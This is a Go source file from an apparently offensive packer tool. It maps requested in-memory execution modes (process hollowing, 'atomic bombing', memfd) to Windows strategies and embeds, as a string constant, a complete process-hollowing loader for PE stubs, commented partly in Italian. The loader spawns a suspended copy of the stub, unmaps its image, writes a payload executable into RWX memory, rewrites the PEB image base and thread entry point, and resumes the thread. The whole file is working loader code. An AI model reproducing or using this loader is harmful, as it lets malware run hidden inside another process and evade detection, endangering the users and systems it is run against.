package windows

import (
	"fmt"

	common "gosstrip/pack/strategies/common"
)

// Resolve normalizes the requested mode into a Windows-supported strategy.
func Resolve(mode common.Mode) (common.Mode, error) {
	switch mode {
	case common.ModeOff:
		return common.ModeOff, nil
	case common.ModeAuto, common.ModeProcessHollowing:
		return common.ModeProcessHollowing, nil
	case common.ModeAtomicBombing:
		return common.ModeAtomicBombing, nil
	case common.ModeMemfd:
		return common.ModeOff, fmt.Errorf("in-memory mode %q is only available for ELF targets", mode)
	default:
		return common.ModeOff, fmt.Errorf("unknown in-memory mode %q", mode)
	}
}

// Describe produces a human-friendly summary for logs.
func Describe(mode common.Mode) string {
	switch mode {
	case common.ModeOff:
		return "temporary file"
	case common.ModeProcessHollowing:
		return "in-memory (process hollowing)"
	case common.ModeAtomicBombing:
		return "in-memory (atomic bombing)"
	default:
		return fmt.Sprintf("in-memory (%s)", mode)
	}
}

// ProcessHollowingRuntime embeds the Go implementation injected into PE stubs.
const ProcessHollowingRuntime = `
// executeProcessHollowing esegue il payload usando Process Hollowing
// Tecnica: crea processo sospeso, unmap originale, mappa nuovo PE, resume
func executeProcessHollowing(payload []byte) {
	// 1. Parse PE headers
	if len(payload) < 0x1000 {
		executeFromTemp(payload)
		return
	}

	// DOS Header check
	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}

	// Get PE offset
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-4) {
		executeFromTemp(payload)
		return
	}

	// PE signature check
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	// Parse Optional Header
	optHeaderOffset := peOffset + 24 // sizeof(IMAGE_FILE_HEADER)
	imageBase := binary.LittleEndian.Uint64(payload[optHeaderOffset+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])

	// 2. Crea processo sospeso
	exePath, _ := os.Executable()
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// CREATE_SUSPENDED = 0x4
	err := createProcess(
		syscall.StringToUTF16Ptr(exePath),
		nil,
		nil,
		nil,
		false,
		0x4,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		executeFromTemp(payload)
		return
	}

	// 3. Get thread context per accesso PEB
	// Full CONTEXT structure (1232 bytes per x64)
	ctx := make([]byte, 1232)
	// Set CONTEXT_INTEGER flag (0x00100000 | 0x00000002) at offset 48
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100002)

	ret, _, _ := procGetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 4. Extract Rdx (pointer to PEB) - offset 136 in CONTEXT
	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	// 5. Read actual ImageBase from PEB+16
	baseAddrBytes := make([]byte, 8)
	var bytesRead uintptr
	ret, _, _ = procReadProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16),
		uintptr(unsafe.Pointer(&baseAddrBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || bytesRead != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	baseAddr := binary.LittleEndian.Uint64(baseAddrBytes)

	// 6. Unmap processo originale
	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
	if ret != 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 7. Alloca memoria per nuovo PE (prova prima imageBase, poi baseAddr)
	newBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)

	if newBase == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 8. Scrivi headers con error check
	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:0x1000]) {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 9. Scrivi sezioni PE con error check
	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	sectionTableOffset := optHeaderOffset + 240 // sizeof(IMAGE_OPTIONAL_HEADER64)

	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := sectionTableOffset + (uint32(i) * 40) // sizeof(IMAGE_SECTION_HEADER)
		if sectionOffset+40 > uint32(len(payload)) {
			break
		}

		virtualAddress := binary.LittleEndian.Uint32(payload[sectionOffset+12:])
		sizeOfRawData := binary.LittleEndian.Uint32(payload[sectionOffset+16:])
		pointerToRawData := binary.LittleEndian.Uint32(payload[sectionOffset+20:])

		if pointerToRawData > 0 && sizeOfRawData > 0 {
			end := pointerToRawData + sizeOfRawData
			if end <= uint32(len(payload)) {
				sectionData := payload[pointerToRawData:end]
				if !writeProcessMemoryChecked(pi.Process, newBase+uintptr(virtualAddress), sectionData) {
					syscall.TerminateProcess(pi.Process, 1)
					executeFromTemp(payload)
					return
				}
			}
		}
	}

	// 10. Update PEB con nuovo ImageBase (CRITICO)
	newBaseBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
	var bytesWritten uintptr
	ret, _, _ = procWriteProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16), // PEB+16 = ImageBaseAddress
		uintptr(unsafe.Pointer(&newBaseBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 || bytesWritten != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 11. Modifica RCX (entry point) nel context - offset 128 per x64
	binary.LittleEndian.PutUint64(ctx[128:], uint64(newBase)+uint64(addressOfEntryPoint))

	ret, _, _ = procSetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	// 12. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))
}

func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.SecurityAttributes,
	inheritHandles bool, flags uint32, env *uint16, dir *uint16,
	si *syscall.StartupInfo, pi *syscall.ProcessInformation) error {

	r1, _, e1 := procCreateProcess.Call(
		uintptr(unsafe.Pointer(name)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(unsafe.Pointer(procAttr)),
		uintptr(unsafe.Pointer(threadAttr)),
		boolToUintptr(inheritHandles),
		uintptr(flags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(dir)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func writeProcessMemoryChecked(process syscall.Handle, base uintptr, data []byte) bool {
	var written uintptr
	ret, _, _ := procWriteProcessMem.Call(
		uintptr(process),
		base,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	return ret != 0 && written == uintptr(len(data))
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}
`
